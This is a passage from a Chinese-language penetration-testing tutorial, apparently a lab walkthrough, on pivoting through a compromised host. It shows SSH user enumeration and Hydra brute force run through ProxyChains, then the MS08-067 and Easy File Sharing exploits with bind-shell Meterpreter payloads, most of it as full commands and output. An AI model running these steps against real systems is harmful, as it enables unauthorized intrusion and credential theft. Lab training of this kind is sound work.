#### 通过跳板进行SSH暴力破解
通过跳板进行SSH暴力破解
此前，7.7.7.20主机也被发现存在SSH服务。对这台主机执行一次暴力破解也是非常简单的。
使用“ **ssh_enumusers** ”模块来枚举用户：
    msf > use auxiliary/scanner/ssh/ssh_enumusers 
    msf auxiliary(ssh_enumusers) > set rhosts 7.7.7.20
    rhosts => 7.7.7.20
    msf auxiliary(ssh_enumusers) > set rport 22
    rport => 22
    msf auxiliary(ssh_enumusers) > set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    user_file => /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    msf auxiliary(ssh_enumusers) > run
    [*] 7.7.7.20:22 - SSH - Checking for false positives
    [*] 7.7.7.20:22 - SSH - Starting scan
    [+] 7.7.7.20:22 - SSH - User 'admin' found
    [-] 7.7.7.20:22 - SSH - User 'root' not found
    [-] 7.7.7.20:22 - SSH - User 'Administrator' not found
    [+] 7.7.7.20:22 - SSH - User 'sysadm' found
    [-] 7.7.7.20:22 - SSH - User 'tech' not found
    [-] 7.7.7.20:22 - SSH - User 'operator' not found
    [+] 7.7.7.20:22 - SSH - User 'guest' found
    [-] 7.7.7.20:22 - SSH - User 'security' not found
    [-] 7.7.7.20:22 - SSH - User 'debug' not found
    [+] 7.7.7.20:22 - SSH - User 'manager' found
    [-] 7.7.7.20:22 - SSH - User 'service' not found
    [-] 7.7.7.20:22 - SSH - User '!root' not found
    [+] 7.7.7.20:22 - SSH - User 'user' found
    [-] 7.7.7.20:22 - SSH - User 'netman' not found
    [+] 7.7.7.20:22 - SSH - User 'super' found
    [-] 7.7.7.20:22 - SSH - User 'diag' not found
    [+] 7.7.7.20:22 - SSH - User 'Cisco' found
    [-] 7.7.7.20:22 - SSH - User 'Manager' not found
    [+] 7.7.7.20:22 - SSH - User 'DTA' found
    [-] 7.7.7.20:22 - SSH - User 'apc' not found
    [+] 7.7.7.20:22 - SSH - User 'User' found
    [-] 7.7.7.20:22 - SSH - User 'Admin' not found
    [+] 7.7.7.20:22 - SSH - User 'cablecom' found
    [-] 7.7.7.20:22 - SSH - User 'adm' not found
    [+] 7.7.7.20:22 - SSH - User 'wradmin' found
    [-] 7.7.7.20:22 - SSH - User 'netscreen' not found
    [+] 7.7.7.20:22 - SSH - User 'sa' found
    [-] 7.7.7.20:22 - SSH - User 'setup' not found
    [+] 7.7.7.20:22 - SSH - User 'cmaker' found
    [-] 7.7.7.20:22 - SSH - User 'enable' not found
    [+] 7.7.7.20:22 - SSH - User 'MICRO' found
    [-] 7.7.7.20:22 - SSH - User 'login' not found
    [*] Caught interrupt from the console...
    [*] Auxiliary module execution completed
    ^C
    msf auxiliary(ssh_enumusers) >
除了Metasploit框架中的辅助模块，kali中的系统工具例如Hydra也是可以使用的。通过ProxyChains运行hydra，所有的流量都会通过跳板机导入到目标网络中.
    root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
    ProxyChains-3.1 (http://proxychains.sf.net)
    Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    Hydra (http://www.thc.org/thc-hydra) starting 
    [WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
    [DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
    [DATA] attacking service ssh on port 22
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    <><>-OK
    <><>-OK
    <><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    [22][ssh] host: 7.7.7.20   login: admin   password: 123456
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    <><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished
    root@kali:~#
    root@kali:~# proxychains ssh PI:EMAIL
    ProxyChains-3.1 (http://proxychains.sf.net)
    |D-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.
    ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.
    PI:EMAIL's password: 
    bvshell:/C/Documents and Settings/All Users$ pwd
    /C/Documents and Settings/All Users
    bvshell:/C/Documents and Settings/All Users$ dir
    2016-12-24  21:32           Application Data
    2016-12-25  06:16           Desktop
    2016-12-24  18:36           Documents
    2016-12-24  18:37           DRM
    2016-12-24  21:32           Favorites
    2016-12-24  18:38           Start Menu
    2016-12-24  21:32           Templates
          0 Files                  0 bytes
          7 Directories
    bvshell:/C/Documents and Settings/All Users$
### 获取第二个跳板
此前的nmap扫描中，我们在7.7.7.0/24网段中发现来两个漏洞，分别是MS08-067和“Easy File
Share”应用的BoF漏洞。通过任意漏洞都能够获取目标系统的控制权限。当然，还有SSH登录这个额外的选择
#### MS08-067 with Bind TCP
在metasploit框架中可以使用模块“ **exploit/windows/smb/ms08_067_netapi**
”来实施MS08-067利用。关键点在于载荷类型的选择是TCP绑定类型。由于没有定义双向路由规则，目标系统不能直接访问攻击者。因此，需要选择TCP绑定类型在目标系统中创建一个特定的监听端口等待攻击者连接。漏洞成功利用后，将会自动向目标系统的监听端口发起建立连接操作。
TCP反弹和TCP绑定的区别如下图所示：
配置TCP绑定方式的MS08-067漏洞利用模块，并获取目标系统权限：
    msf > use exploit/windows/smb/ms08_067_netapi 
    msf exploit(ms08_067_netapi) > show options 
    Module options (exploit/windows/smb/ms08_067_netapi):
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------       RHOST                     yes       The target address
       RPORT    445              yes       The SMB service port
       SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
    Exploit target:
       Id  Name
       --  ----       0   Automatic Targeting
    msf exploit(ms08_067_netapi) > set rhost 7.7.7.20
    rhost => 7.7.7.20
    msf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf exploit(ms08_067_netapi) > show options 
    Module options (exploit/windows/smb/ms08_067_netapi):
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------       RHOST    7.7.7.20         yes       The target address
       RPORT    445              yes       The SMB service port
       SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
    Payload options (windows/meterpreter/bind_tcp):
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LPORT     4444             yes       The listen port
       RHOST     7.7.7.20         no        The target address
    Exploit target:
       Id  Name
       --  ----       0   Automatic Targeting
    msf exploit(ms08_067_netapi) > run
    [*] Started bind handler
    [*] 7.7.7.20:445 - Automatically detecting the target...
    [*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
    [*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English
    [*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)
    [*] 7.7.7.20:445 - Attempting to trigger the vulnerability...
    [*] Sending stage (957999 bytes) to 7.7.7.20
    [*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -> 7.7.7.20:4444) 
    meterpreter >
#### Easy File Share BoF
另外一个漏洞是Easy File Share应用。通过以下步骤配置漏洞利用模块为TCP绑定方式，并获取系统权限。
    msf  > use exploit/windows/http/easyfilesharing_seh 
    msf exploit(easyfilesharing_seh) > show options 
    Module options (exploit/windows/http/easyfilesharing_seh):
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------       RHOST                   yes       The target address
       RPORT  80               yes       The target port
    Exploit target:
       Id  Name
       --  ----       0   Easy File Sharing 7.2 HTTP
    msf exploit(easyfilesharing_seh) > set rhost 7.7.7.20
    rhost => 7.7.7.20
    msf exploit(easyfilesharing_seh) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf exploit(easyfilesharing_seh) > run
    [*] Started bind handler
    [*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
    [+] 7.7.7.20:80 - Exploit Sent
    [*] Sending stage (957999 bytes) to 7.7.7.20
    [*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -> 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300
    meterpreter > ipconfig
    Interface  1
    ============
    Name         : MS TCP Loopback interface
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1520
    IPv4 Address : 127.0.0.1
    Interface 65539
    ============
    Name         : Intel(R) PRO/1000 MT Desktop Adapter
    Hardware MAC : 08:00:27:29:cd:cb
    MTU          : 1500
    IPv4 Address : 8.8.8.3
    IPv4 Netmask : 255.255.255.0
    Interface 65540
    ============
    Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
    Hardware MAC : 08:00:27:e3:47:43
    MTU          : 1500
    IPv4 Address : 7.7.7.20
    IPv4 Netmask : 255.255.255.0
    meterpreter >
完成以后，攻击者来到来如下位置：
由于我们获取了7.7.7.20主机的控制权限。我们需要再次进行信息搜集。JC主机和RD一样也拥有双网卡。这意味着我们又发现了一个新的内网（8.8.8.0/24）。
    meterpreter > ipconfig
    Interface  1
    ============